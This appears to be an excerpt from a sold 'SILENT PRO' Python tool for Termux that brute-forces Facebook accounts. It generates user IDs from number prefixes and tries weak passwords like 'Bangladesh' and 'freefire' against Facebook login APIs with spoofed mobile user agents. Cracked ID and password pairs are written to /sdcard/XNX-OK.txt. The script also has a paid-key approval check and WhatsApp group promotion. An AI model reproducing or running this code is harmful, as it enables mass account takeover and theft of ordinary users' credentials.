...
os.system('xdg-open https://chat.whatsapp.com/JtkDqSI3k4C4Bb4ACuETId/?ref=share/')
...
\033[1;37m[-] VERSION   :\033[1;32m 10.9
\033[1;37m[-] STATUS    :\033[1;32m PREMIUM
--------------------------------------------------
\033[1;37m[-]DEAR PAID USERS NEED A BACHI YAWR:
\033[1;37m[-]UPDATE DATE: 10/04/23
\033[1;37m[-]USE AIRPLANE MODE FOR SPEED OK IDZ:
--------------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' Try Methods ')
                                linex()
                                print(' [1] Method 1 KIWI METHOD  \n [2] Method 2API NORMAL \n [3] Method 3BEST ')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                ...
                                os.system(f'xdg-open https://chat.whatsapp.com/EqiB2gzpCCV1jJyd1HdXEQ');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://chat.whatsapp.com/EqiB2gzpCCV1jJyd1HdXEQ');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://chat.whatsapp.com/EqiB2gzpCCV1jJyd1HdXEQ');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ')
                        ...
                        linex()
                        tks = ("Hi SILENT Sir, I Need To Buy Your Paid SILENT PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def bd():
                ...
                with tred(max_workers=30) as SILENT:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i SILENT you','iSILENTyou','free fire','freefire']
                                SILENT.submit(rndm,ids,passlist)
                print('\033[1;97m')
                linex()
                print(' The process has completed')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;97m [XNX] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SILENT:
                                ...
                                print('\r\r\033[1;32m SILENT-OK %s | %s'%(ids,pas))
                                open('/sdcard/XNX-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SILENT:
                                if 'y' in pcp:
                                        print('\r\033[1;91m SILENT-CP '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/MessengerLiteForiOS;FBAV/399.0.0.26.69;FBBV/453638119;FBDV/iPad11,4;FBMD/iPad;FBSN/iPadOS;FBSV/16.3.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en;FBOP/0]"
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m SILENT-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XNX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
    ...
    "user-agent": pro,
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mSILENT-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XNX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
    ...
    "user-agent": pro,
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/XNX-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m SILENT-OK '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/XNX-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32mSILENT-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/XNX-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
...
a=requests.get("https://github.com/Maliksohaill/ZiDi-MALIK/blob/main/aprrovel.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    url_wa = "https://api.whatsapp.com/send?phone=+923077681556&text="
    tks = "HELLO SIR PLEASE APPROVE MY KEY THANKS ❤️ :)\\"+"* key: "+key2
    subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
    exit()
...
\033[1;37m[-] VERSION   :\033[1;32m 15.00
